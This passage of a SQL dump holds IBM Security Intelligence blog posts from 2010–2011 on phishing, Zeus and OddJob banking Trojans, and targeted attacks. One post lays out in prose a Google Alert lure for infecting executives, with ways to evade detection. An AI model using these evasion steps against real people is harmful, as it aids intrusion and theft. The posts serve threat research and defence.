subjects reached our landing page within seven days. The total time we invested in this project while building the attack was 17 hours. We approached the 32 subjects who didn’t reach our landing page and asked them why they didn’t click on the link. Sixteen said they never saw the email (it probably went to their spam folder); seven said they don’t usually read LinkedIn updates; nine said that the update was not interesting enough for them to click the link. This research clearly demonstrates that   makes it easy to drive corporate users to fake websites that could potentially download malware onto their computer. Education is always recommended and can certainly help, but in this case, education did not prevent this attack. As we learned, cyber criminals have access to information needed to create fraudulent emails that can fly under the radar of even the most security-savvy users. The solution to this problem must be based on technology and using more than one prevention method. Based on these findings, we strongly recommend that organizations reevaluate their approach to   since they represent the most dangerous type of threat to their business.', '\'Adobe Flash Player\', \'Application Vulnerability\', \'Facebook\', \'LinkedIn\', \'Phishing\', \'RSA\', \'Social Engineering\', \'social media engineering\', \'Twitter\'', 'https://securityintelligence.com/rsa-and-epsilon-research-shows-education-cant-protect-against-new-social-engineering-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (665, 'Google Alert: Get Your Malware Here', 'Mickey Boodaei', '2011-3-23', 'Adobe has released a software update that addresses a number of critical vulnerabilities in its products. There is a good overview of this patch and what you need to do in order to apply it on security researcher Brian Krebs’ blog,  . Krebs has noted that the update comes a week after Adobe warned that a number of miscreants were exploiting the Flash vulnerability to launch targeted attacks on users. Cyber criminals have also discovered how to exploit a user’s Google Alert to gain access to sensitive information. Let’s explore how. The concept of targeted attacks and the use of this technique to punch through the security defenses of organizations is gaining momentum. This week, for example, we’ve seen a lot of coverage about yet another targeted attack against a large enterprise: RSA. When reading about these attacks, it’s worth keeping in mind that most do not make the news for several reasons. One obvious reason is the fact that many of them have not yet been discovered. When an enterprise does discover an attack, those involved often fail to understand its implications. They simply disinfect their system and move on. IBM has been researching targeted attacks for years, and we have concluded that these types of attacks represent the future of online fraud and financial industry darkware. To demonstrate   and why we should take them so seriously, I’d like to share with you one example of a simple and very effective targeted attack method. We’re in no way suggesting that this attack hit RSA, and we do not have any information about that particular attack. Let’s call this attack example Vanity Infection from Google News Searches (VIGNS). The purpose of the VIGNS attack is to place under-the-radar malware on a computer owned by an executive who has access to sensitive corporate information. Once the malware is on the executive’s computer, it can transmit information on an ongoing basis to an IP address of the hacker’s choice. The attack process, as with any targeted attack, starts with some form of reconnaissance. The attacker searches the business social networking site LinkedIn for executives at the targeted organization. LinkedIn is the perfect tool for that: Cyber criminals can find victims easily by searching the company name and the role they are after. An attacker then reads the victim’s professional profile and decides whether he or she is a good fit. If the executive is a good fit, then all the attacker needs to continue the attack is the name of the victim. Next, the attacker needs to build a Web page that infects its visitors. It doesn’t matter where the page is placed; criminals we have observed have access to a large number of compromised servers. The page itself exploits a zero-day or recently discovered browser or browser add-on vulnerability. The recently announced Adobe vulnerabilities are a perfect example and can be used to achieve this goal easily. At any given time, it’s easy to find   that can be used for this purpose. The attackers now have a Web page that can be used to infect visitors with malware and the name of the victim whose computer they want to compromise. \n But how do they get the victim to visit this page? With the help of Google and their own vanity. Most executives tend to have a Google Alert set up on their name. By placing the victim’s name within the malicious Web page, it is possible to get Google to index the page and generate a Google Alert on the executive’s name. The executive will receive the alert and will most likely click the link to check on who is mentioning him or her. Clicking the link will take the executive to a malicious Web page that will then infect their computer — simple. Here’s where it gets interesting. Our researchers have discovered a number of ways to get this attack to fly under the radar of IT security software. The first method is to delay posting the exploit on the Web page until after Google’s indexing systems have visited the page in question. This will minimize the time frame that the exploit is active and detectable. The attackers can easily check when Google visits the malicious Web page and turn on the exploit only after the search engine has made its pass. The second method is to take the Web page off immediately after the malware reports back that it gained access to the executive’s computer. The malware will know where it has landed by looking at information such as the email account on the computer. This approach minimizes the time of exposure for the malicious Web page, as well. The next method is to have the malicious Web page redirect to an old news page that legitimately mentions the executive’s name. When the executive accesses the malicious page the malware infects the computer, but since only an old news page appears, the victim does not suspect any problems. Another method involves blocking any bots from visiting the malicious website other than those that the attacker wants to let in, such as Google. This prevents bots that are looking for compromised Web pages from tagging the page as infected or otherwise malicious. It’s also worth noting that it is possible to apply a number of hacker techniques to ensure that the malware goes undetected. Even if the cyber criminals decide to use a known   such as Zeus or SpyEye, they can generate a variant that is undetectable by antivirus products without much trouble. After testing the code with anti-malware software, they can limit its distribution to only the specified — and malicious — Web page. This will keep antivirus solutions from classifying it as a threat. The cyber criminals can even make the attack harder to detect by programming the malware to remove itself if it reaches the wrong computer, again by looking at simple parameters such as the email account configured on the computer. For those readers who think we may be teaching criminals how to execute a targeted attack, rest assured that our research suggests that the criminals are much more sophisticated. This is, as I mentioned, a simple targeted attack, and we have seen far more complex and sophisticated attacks in the wild. So how do you protect against this type of attack? Being cautious is not enough. I consider myself to be fairly sophisticated when it comes to security awareness, yet even I would fall for this type of attack. Keeping systems and antivirus software up to date won’t help, either. The attack uses zero-day unpatched exploits and the malware is completely unknown to antivirus vendors. One possible solution is to use tools that specialize in zero-day attack prevention, such as  . Our R&D teams are continuously incorporating new knowledge into the Secure Web Access product to block zero-day malware. The difference between Trusteer Apex and other desktop   is in our data-centric approach. We look at sensitive data and applications on the computer and identify unknown pieces of software that attempt to access them. Our software can then block access, report the attempt or remove the violating software from the computer. Since all of these attacks are ultimately looking for sensitive information, this approach is the most likely to detect and block any malicious software that has not yet been seen. The methodology I have presented above is just one in a series of sophisticated targeted attacks we expect will be launched against organizations in the near future. We strongly recommend that organizations reevaluate their approach to targeted attacks. As we have witnessed with various incidents in the press, they represent the most dangerous type of threat to their business.', '\'Adobe Flash Player\', \'Google\', \'targeted attack\', \'Trusteer Apex\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/google-alert-get-your-malware-here/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (666, 'OddJob: New Financial Trojan Keeps Online Banking Sessions Open After Users Logout', 'Amit Klein', '2011-2-22', 'IBM has found a new type of financial malware with the ability to hijack customers’ online banking sessions in real time using their session ID tokens. OddJob, the name we have given this Trojan, keeps sessions open after customers think they have logged out, enabling   to extract money and commit fraud unnoticed. This is a completely new piece of malware that pushes the hacking envelope through the evolution of existing attack methodologies. It illustrates how hacker ingenuity can sidestep many commercial   traditionally used to defend users’ digital monetary assets. We have been monitoring OddJob for a few months but have not been able to report on its activities until now due to ongoing investigations by law enforcement agencies, which are now complete. However, IBM has already warned financial institutions that criminals based in Eastern Europe are using OddJob to attack customers in several countries, including the United States, Poland and Denmark. Our research team has reverse engineered and dissected OddJob’s code methodology, right down to the banks it targets and its attack methods. The most interesting aspect of the malware is that it appears to be a work in progress. We have seen differences in hooked functions in recent days and weeks as well as the way the command-and-control (C&C) protocols operate. We believe that those functions and protocols will continue to evolve in the near future and that our analysis of the malware’s functionality may not be 100 percent complete as the code writers continue to refine it. OddJob’s most obvious characteristic is that it is designed to intercept user communications through the browser to steal or inject information and terminate user sessions inside Internet Explorer and Firefox. We have extracted OddJob’s configuration data and concluded that it is capable of performing different actions on targeted websites, depending on its configuration. The code is capable of logging GET and POST requests, grabbing full pages, terminating connections and injecting data into Web pages. All logged requests and grabbed pages are sent to the C&C server in real time, allowing fraudsters to perform session hijacks — also in real time but hidden from the legitimate user of the online bank account. By tapping the session ID token, which banks use to identify a user’s online banking session, the fraudsters can electronically   and complete a range of banking operations. The most important difference from conventional hacking is that the fraudsters do not need to log in to the online banking computers. They simply ride on the existing and authenticated session, much as a child might slip unnoticed through a turnstile at a sports event. Another interesting feature of OddJob, which makes it stand out from the malware crowd, is its ability to bypass users’ logout request to terminate their online session. Because the interception and termination are carried out in the background, the legitimate user thinks he has logged out, when in fact the fraudsters remain connected, allowing them to maximize the profit potential of their fraudulent activities. All matching is case-insensitive, and using this process of pattern matching, fraudsters using the Trojan are able to cherry-pick the sessions and targets they swindle to their best advantage. The final noteworthy aspect of OddJob is that the malware’s configuration is not saved to disk, a process that could trigger a security analysis application. Instead, a fresh copy of the configuration is fetched from the C&C server each time a new browser session is opened. It’s important to note that OddJob is just one of several proactive malware applications that our research team sees on a regular basis, but its coding methodology indicates a lot of thought on the part of the coders behind the fraudware. Careful analysis and research is needed to reverse engineer and dissect fraudulent applications like OddJob, but our message to banks and their online banking users is unchanged. They need to maintain constant vigilance, apply software updates, maintain an awareness of new threats and deploy complementary   that can defend against evolving attack methods.', '\'Command-and-Control (C&C)\', \'Firefox\', \'Internet Explorer (IE)\', \'security applications\', \'Trojan\'', 'https://securityintelligence.com/oddjob-new-financial-trojan-keeps-online-banking-sessions-open-after-users-logout/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (667, 'A Warning to the IT Security Industry: Zeus Continues to Evolve', 'Amit Klein', '2011-2-3', 'Despite having been around for several years, Zeus continues to be a thorn in the side of the IT security industry and its business users mainly because of its constantly-evolving profile. The ease with which   can develop the malware for new and varied applications partially drives this evolving profile. Our ongoing research here at IBM confirms the evolution of  , with a growing number of websites that host Zeus variants as well as the rising volume of networks hosting command-and-control (C&C) servers for the Zeus botnet swarms. Over the last four months, IBM’s research teams have been analyzing the geographical IP distribution of sites hosting Zeus configurations. Our research shows that the United States (39.8 percent), Russia (21.6 percent) and Ukraine (6.5 percent) were the top three host countries, with Eastern Europe accounting for 32 percent of Zeus configs. That doesn’t mean other countries are off the hook: China, Malaysia, Iraq and Canada, along with Germany, the United Kingdom and the Netherlands, are also responsible for websites with hosted Zeus environments. Our research team has also analyzed which organizations/service providers have the dubious distinction of ranking high in the Zeus C&C site stakes. Analyzing 20 of the organizations that account for over half of the C&C controllers reveals that five of the 20 service providers — Informex, PAN-SAM Ltd., LLC Management and Information, S.Point and Delta-X LTD — are on the Ukrainian networks, responsible for 16 percent of Zeus C&C servers. Another five service providers are on the U.S. networks and responsible for 14 percent of Zeus C&C systems, with GoDaddy.com accounting for a hefty 5 percent of American Zeus C&C sites. Based on this research, our analysts tested the accessibility of sites used as a Zeus C&C platform. The analysis of IP-accessible sites over the last 80 days makes for some interesting reading: 29 percent were found to be U.S. Websites, with Ukraine (17 percent) and Russia (14 percent) once again joining the United States in the Zeus hall of shame. Delving into the research reveals some surprising data. For instance, the United Kingdom accounts for 6 percent, and the rising technology nation of Poland account for 5 percent of IP-accessible C&C systems. Equally surprising was the inclusion of Bosnia and Herzegovina on the charts with 3 percent — no mean feat for a country of just 3.8 million people. More than anything, these detailed statistics show that the global Internet is becoming highly diversified very quickly, but the increasing usage of automated registration and servicing systems on the Internet means that human operator monitoring of hosted systems has become less frequent in those countries with good Internet access. While it drives the cost of hosting downward, the lack of monitoring makes it all too easy to register and set up a C&C and/or Zeus-infected website plus allied systems and use the platform to infect the general Internet-user community. IBM will continue to monitor and report the continuing evolution of Zeus and its many variant infections, detailing the results for our many friends in the  . Thanks to Tanya Shafir from the IBM Security Trusteer research team for providing the data for this post.', '\'Hackers\', \'IT Security\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/warning-security-industry-zeus-continues-evolve/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (668, 'Mobile Users 3 Times More Vulnerable to Phishing Attacks', 'Mickey Boodaei', '2011-1-4', 'In 2011 IBM gained access to the log files of several Web servers that were hosting websites conducting   attacks. Analyzing these log files was an interesting exercise. Specifically, they provided visibility into how many users accessed the websites, when they visited them, whether they submitted their login information and what devices they used to access the website. Here are some of the findings from these logs: As soon as a phishing website is broadcast through fraudulent email messages, the first systems to visit it are typically  . This makes sense since mobile users are “always on” and are most likely to read email messages as soon as they arrive. Meanwhile, desktop users only read messages when they have access to their computers. Also, most fraudulent emails call for immediate action. For example, they usually claim that suspicious activity has been detected in the user’s account and that immediate action is required. Most victims who fall for this ploy will visit the phishing site quickly. . After that, many attacks are blocked by phishing filters or taken down. Hence, mobile users are more likely to be hit by phishing just because they’re “always on.” Here are some mobile user-agent fields spotted in the log files: Mobile Safari: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7 Mobile Safari: Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 Mobile Safari: Mozilla/5.0 (Linux; U; Android 2.2; en-gb; HTC_Desire-orange-LS Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 BlackBerry Browser: BlackBerry8520/5.0.0.681 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123 Mobile Safari: Mozilla/5.0 (BlackBerry; U; BlackBerry 9780; en-GB) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.294 Mobile Safari/534.1+ Symbian Browser: Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/031.023; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3.1 Most users who are at risk of phishing attacks through a dangerous website do not submit their personal information. Some submit fake information. However, compared with desktop users, mobile users are three times more likely to submit private information once they access a phishing website. Why do mobile users trust phishing websites more? One explanation could be that it’s harder to spot a phishing website on a mobile device than on a computer. As a research experiment, IBM analysts compared the user experience of accessing a phishing website on a BlackBerry and an iPhone. Here’s what they found: It’s very difficult to tell whether an email is associated with   since the “From” field doesn’t include the sender’s address; rather, it includes the name of the sender (such as ACME Bank). Some users could interpret that the device trusts the sender more because it just shows the name and not the full address. Although email addresses can be spoofed, certain users will not click through the link in the message if the entire address is visible and appears “phishy.” In HTML mail (the most common format for fraudulent messages), when a link is embedded as a href, hovering over the link will not reveal the actual address. When the user clicks on the link, the BlackBerry device presents the following message: “Continue to” with the real address appended. Due to the limited screen size, if the URL is long enough and well-crafted (e.g., it starts with www.acmebank,com.vdgrtgrt…), it is hard to detect that the URL is not legitimate. Once the BlackBerry switches to the browser and starts loading the phishing website, the top bar shows the website name created by the fraudster (e.g., Welcome to ACME Bank) and the real address is not presented. If the phishing website is a good clone of the authentic bank’s website (and most are), there is no easy way of determining that the website is fraudulent. The experience on this device is similar to the BlackBerry until the user clicks on a link. iPhone devices don’t ask the user if they want to open the URL; they automatically load the page. Unlike the BlackBerry, the iPhone does have an address bar, but due to size limitations, only the beginning of the URL is shown. Here, again, if the URL is well-crafted (e.g., www.acmebank,com.vdgrtgrt…), it’s hard to detect that the URL is not legitimate. Based on IBM’s findings, it is equally difficult to spot phishing websites on BlackBerry and iPhone devices. \n According to Comscore’s October 2010 U.S. Mobile Subscriber Market Share, BlackBerry devices (RIM) are still the market-share leader in the U.S. with almost 36 percent, compared to iPhones (Apple) with 26 percent. Then why are more iPhone users accessing phishing websites? One explanation could be that BlackBerry users, many of whom are issued their device by a business, are more educated about phishing attacks and thus less likely to click these links; and they may also have better protection on their mail servers. Although no data is available to validate this theory, this is a very plausible reason for these findings, assuming the iPhone is in fact more commonly used in the private sector. Also, the message that BlackBerry devices present when a user clicks on the link in a phishing email may discourage a certain percentage of victims from proceeding to the phishing website. Another possibility is that the Comscore market share numbers are inaccurate, and the iPhone has a greater market share than currently documented. Mobile users: Never click on links in email messages since it is difficult to determine who sent the message, what the destination address is and what consequences may occur (phishing attacks,  , scam, etc.). Banks: When customers access Web applications using a mobile device, present them with a noticeable welcome message that reminds them to:', '\'Android\', \'Blackberry\', \'iPhone\', \'Mobile Fraud\', \'Mobile Threats\', \'Phishing\', \'Symbian\'', 'https://securityintelligence.com/mobile-users-3-times-more-vulnerable-to-phishing-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (669, 'Zeus Iteration Targets Online Payment Providers', 'Amit Klein', '2011-1-2', 'Confirming our previous observations, the   continues to evolve, branching out from banking sites and their customers to online payment providers, which are sites with user credentials that allow assets that have a financial value.\n The move mirrors the evolution of card fraud in the 1980s and 1990s, when fraudsters initially targeted banks for cash-advance fraud. Then, as banks developed their internal antifraud resources, criminals moved over to quasi-cash platforms, such as foreign currency purchases, and then to retail and e-tail sales outlets.\n The parallels between card fraud evolution and the evolution of Zeus is reflected in the attack vectors against a few websites our researchers have identified as targets.\n  is an online payment provider that allows you to make online payments without submitting your personal information each time. We have found 26 different Zeus configurations targeting Money Bookers. This usually indicates that fraudsters have a solid business around this target. For comparison, this number doesn’t fall short of some of the highly targeted banks and brands in the world. For those of you who don’t know what a Zeus configuration file is, it’s basically a set of instructions that Zeus gets on which websites to target and what to do with them (steal login credentials, tamper with HTML Web pages, etc). Different configurations represent different work efforts of targeting websites.\n Another interesting target we have found is  . This is another online payment solution that claims to have more than 25 million active users as of April 2014. Thirteen different Zeus configurations target Web Money, with the last released on January 16, indicating that this is a hot target for fraudsters. As with all the other online payment providers, Zeus steals login information and other sensitive information from Web Money users.\n Yet another popular target is  , a U.K.-based online payment company specializing in smaller online businesses. Twelve different Zeus configurations target Nochex, with the last one released on January 16.\n While these three examples represent online payment providers that have been targeted for months, there are newcomers, as well. One example is  , a prepaid card provider that has only recently started to be targeted by Zeus. Users add money to their netSpend account, which they then use to pay for things online.\n The last example for today is  . The e-gold portal is a one that provides a money-like currency and wire transfer services. This website has been indicted in the past for violating money laundering regulations. According to  , “e-gold has been perceived by the United States government as the medium of choice for many online con-artists, with pyramid schemes and high-yield investment programs (“HYIPs”) commonplace.” This website is targeted by 16 different Zeus configuration. Could it be that fraudsters are targeting other fraudsters?\n The genuine   for e-gold asks the user for the account number, passphrase and uses CAPTCHA technology to help prevent automated attacks. On a Zeus-infected machine (with an e-gold targeting configuration), the malware injects an additional element into the login page that requests the alternate password – plus the email associated with the account, which can then presumably be tapped for back-door access to the account.\n We believe this trend of targeting online payment providers will continue as more retailers allow alternative payment methods on their websites.\n The latest U.K. figures on card fraud in the U.K. from KPMG show that card fraud soared by 16 percent in 2010 compared to the previous year, with one of the largest frauds worth a hefty 103 million pounds.\n The story is a similar one in the United States, although research from   found that only 48 percent of fraud is detected at the point of transaction.\n So what can be done to counter Zeus-enabled credential fraud against a diversified range of online payment providers?\n We believe that customers of all sites where purchases are involved need to protect their PC or access terminal using secure browsing services and   that specialize in protecting online payments and online banking. Users should also avoid using public-access computers as well as computers they do not own and therefore have no direct control over. Retailers and payment providers, meanwhile, need to assess the risk associated with their customers’ endpoint devices. They should, we believe, reject transactions from accounts used over insecure endpoints.', '\'Credit Card Fraud\', \'Zeus\'', 'https://securityintelligence.com/zeus-iteration-targets-online-payment-providers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (670, 'Zeus Targets Major US Retailers, Just in Time for the Holidays', 'Amit Klein', '2010-12-8', 'Our research group has discovered a Zeus botnet that is targeting credit card accounts of major U.S. retailers, including Macy’s and Nordstrom, just as the holiday gift-buying season is in full swing. We captured and analyzed malware samples that were designed to steal credit card information likely to conduct card-not-present (CNP)  . This attack is using a Zeus 2.1.0.8 botnet, the latest and most sophisticated version of the   platform.\n CNP fraud refers to transactions in which a credit card is not physically present, as in an Internet, mail or phone purchase. It is difficult for a merchant to verify that the actual cardholder is indeed authorizing the purchase, so card issuers tend to charge merchants higher fees for CNP transactions. To make matters worse, merchants are typically responsible for fraudulent CNP transactions. Therefore, CNP merchants must take extra precautions against fraud exposure and associated losses.\n The attack we discovered uses social engineering to gather additional information beyond the credit card number that makes it easier for the criminal to bypass   measures used to investigate suspicious transactions. In this case, the social engineering method used is very credible because the victim has navigated to the card issuer’s website —   and   — when Zeus injects a seemingly legitimate Man in the Middle (MitM) pop-up that requests personally identifiable information.\n Merchants and card issuers invest a great deal in back-end technologies for detecting fraudulent transactions. These systems represent an important security layer, but the increase in malware and phishing attacks that specifically target card information is making them less effective. In response, an additional layer that can prevent card information from being stolen in the first place is now required. As this latest Zeus configuration demonstrates, criminals are constantly changing and refining their attack methods. Although merchants and card issuers of major U.S. retailers can’t adapt their   as quickly as criminal groups can modify their attacks, they need to identify and accept when current protection methods are no longer sufficient and refresh their defense mechanisms accordingly.', '\'Card-Not-Present (CNP) Fraud\', \'E-commerce\', \'Man-in-the-Middle (MitM)\', \'Online Shopping\'', 'https://securityintelligence.com/zeus-targets-major-us-retailers-just-in-time-for-the-holidays/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (671, 'The Golden Hour of Phishing Emails', 'Amit Klein', '2010-12-1', 'IBM recently conducted research into the attack potency and time-to-infection of  . One of its findings was eye-popping: Fifty percent of phishing victims’ credentials are harvested by cybercriminals within the first 60 minutes of phishing emails being received. Given that a typical phishing campaign takes at least one hour to be identified by IT security vendors — which doesn’t include the time required to take down the phishing website — analysts have dubbed the first 60 minutes of a phishing site’s existence the crucial “golden hour.” The fact that so many Internet users visit a phishing website within such a short period of time means that blocking a phishing website (which is sometimes a cracked legitimate site) within this golden hour has become absolutely critical. During the golden hour, IBM research suggests that: Therefore, blocking a phishing site after five to 10 hours is practically irrelevant. A more effective model would prevent users from being directed to a   and/or prevent them from entering their credentials if they do end up on a criminal site. This industry’s goal should be to reduce the time it takes for institutions to detect if they are being targeted by a phishing attack from hours to within minutes of the first customer attempting to access a rogue phishing page. Businesses also need to establish quick feeds into browsers and other   so that phishing filters can be updated much more quickly than they are today. This is the only way to swiftly take down   emails and websites, protect customers and conquer the golden hour.', '\'Credentials\', \'Credentials Theft\', \'Cybercriminals\', \'Phishing\'', 'https://securityintelligence.com/the-golden-hour-of-phishing-emails/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (672, 'Financial Malware Uses Configuration File to Target Enterprise', 'Amit Klein', '2010-11-16', 'We’re all familiar with Zeus, the king of  . Infamous for targeting banks, credit unions and financial institutions,   silently steals password and account information from customers of these institutions and uses their credentials to execute fraudulent money transfers. A lesser known fact is that Zeus now also targets and   companies. Once Zeus is installed on a victim’s machine, it fetches a configuration file from one of its command and control servers. The file instructs Zeus on which websites and applications to target, which information to steal and how to steal it. This information is encrypted and is usually hard to capture. As part of our ongoing research, we capture and decrypt Zeus configurations to study them. Some of the Zeus 2.0 configurations we recently decrypted include the following code: In English, this string tells Zeus the following: The “@” means “capture a screenshot of the text within the mouse’s vicinity when the left button is clicked.” The */citrix/* further specifies that this screenshot should be captured when the text “/citrix/” appears in the browser address bar. This code instructs Zeus to take a screenshot every time the left button is clicked while the browser’s URL includes the term “/citrix/.” Here, Zeus is trying to capture login credentials from users of the Citrix Access Gateway, a popular SSL VPN solution used by businesses to provide secure remote access to applications and data inside their protected network.   always seek the path of least resistance. In the case of enterprise networks, the least secure path is through mobile and remote employee computers, which are outside the control of most internal IT departments. Citrix is well aware and concerned about the threat of keyloggers and their ability to capture a user’s login information for the Citrix Access Gateway. In order to protect against this type of attack, Citrix developed a virtual keyboard solution. According to its  : “Keyloggers are becoming an increasing threat on the Internet, and pose a risk to security of corporate networks. They are applications that run silently on a PC or Internet kiosk and record the keystrokes entered by a user for later review. They pose a risk because they can capture usernames and passwords entered, which can then be reviewed and used in obtaining unauthorized access to the corporate network.” The Citrix Access Gateway allows companies to customize the login page to include a virtual on-screen keyboard that replaces the physical keyboard. So instead of typing a password on the physical keyboard, mouse clicks are used to press keys drawn on the screen. This approach prevents keyloggers from capturing keystrokes, since there are none to capture. The Zeus configuration snippet shown above is specifically designed to defeat the virtual keyboard capability in the Citrix Access Gateway. By capturing screenshots within the vicinity of the pointer during mouse clicks, Zeus is able to read the user’s password, which will clearly show up as the sequence of keys the mouse pointer was pointing at when the mouse was clicked. This attack code clearly illustrates that Zeus is actively targeting enterprises, specifically remote access connections into secure networks. Fraudsters are no longer satisfied with simply going after bank accounts; they are also targeting intellectual property and sensitive information contained in company IT networks and applications. Users of remote access VPN systems like the Citrix Access Gateway (employees, contractors and partners) are purposely being targeted in a given configuration file because their computers are unmanaged and easily compromised with sophisticated malware like  . As a result, corporate IT departments should be aware of this   and take steps to protect their unmanaged computers and remote sessions. These include limiting VPN access to specific applications and users, maintaining up-to-date malware protection on remote devices, using a secure browsing service to protect VPN connections and educating users on computer hygiene and secure browsing best practices.', '\'Advanced Malware\', \'Advanced Persistent Threat (APT)\', \'Advanced Threat Protection\', \'Advanced Threats\', \'Banking\', \'Financial Industry\', \'Financial Institutions\', \'Financial Malware\', \'Keylogger\', \'Malware\', \'Secure Sockets Layer (SSL)\', \'Virtual Private Network (VPN)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/financial-malware-uses-configuration-file-target-enterprise/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (673, 'The Impact of Microsoft’s Malicious Software Removal Tool on the Fraud Industry', 'Mickey Boodaei', '2010-11-3', 'On Oct. 12, 2010, Microsoft added detection and removal capabilities for the Zeus financial malware (also known as Zbot and Wsnpoem) to its  . MSRT, which was first introduced in 2005, is updated monthly and released on the second Tuesday of each month to scan user’ computers. It is meant to help prevent the infection and spread of the most prevalent forms of malware. Microsoft’s decision to join the fight against financial malware is an important step. Winning the war against criminals requires the participation and cooperation of more software vendors and increased involvement by law enforcement agencies. I hope Microsoft’s efforts won’t stop here since there is still a lot more to be done. With MSRT out in the field, our research organization decided to evaluate its effectiveness in detecting and removing Zeus. They tested MSRT against hundreds of   files and found that MSRT detects Zeus 2.0 46 percent of the time, but it was unable to detect the new 2.1 version of this financial Trojan. The good news is that MSRT has been able to kill approximately half of the Zeus population and will continue to do so. This detection rate is very respectable. Most if not all antivirus solutions have a much lower detection rate; however, this low detection rate also emphasizes how hard it is to remove Zeus. Zeus also has a significant advantage over MSRT when it comes to committing fraud. Since MSRT does not operate in real time and only disinfects a machine when it is running, hackers have a golden window of opportunity between the time of a Zeus infection and the next scan by MSRT to siphon off money from the victim’s bank account. Thousands of new computers are infected with Zeus every day and are instantly analyzed by fraudsters. Our research team has found that financial fraud usually occurs shortly after a computer is infected with Zeus because sensitive information is immediately transmitted back to the criminals. In the majority of cases, the ability of MSRT to prevent Zeus-related fraud and data loss will be minimal because the damage has already been done by the time it performs its scan. I believe that MSRT will actually serve to further shorten the time between a machine becoming infected and the time it is used to commit fraud. I also expect this will reduce the effectiveness of antivirus solutions because they typically cannot detect a new variant until a few days after it is released. I also wouldn’t be surprised if some financial malware starts targeting MSRT to render it useless. Based on previous activity I have witnessed by financial malware developers, this is very likely. Zeus and other financial malware can accomplish this fairly easily since they have a distinct technical advantage over MSRT: They are already running when MSRT starts scanning. This allows the Trojan to block MSRT from running altogether. Disabling MSRT will inflict even further damage since it is effective at detecting and removing many other forms of malware. Microsoft is working hard and making important contributions toward improving online security with their Malicious Software Removal Tool and Microsoft Security Essentials. However, in the battle against Zeus, I believe Microsoft chose the wrong weapon. What’s needed are   and more operating system improvements if we want to defeat Zeus and others like it.', '\'Financial Malware\', \'Microsoft\', \'Zbot\', \'Zeus\'', 'https://securityintelligence.com/the-impact-of-microsofts-malicious-software-removal-tool-on-the-fraud-industry/');
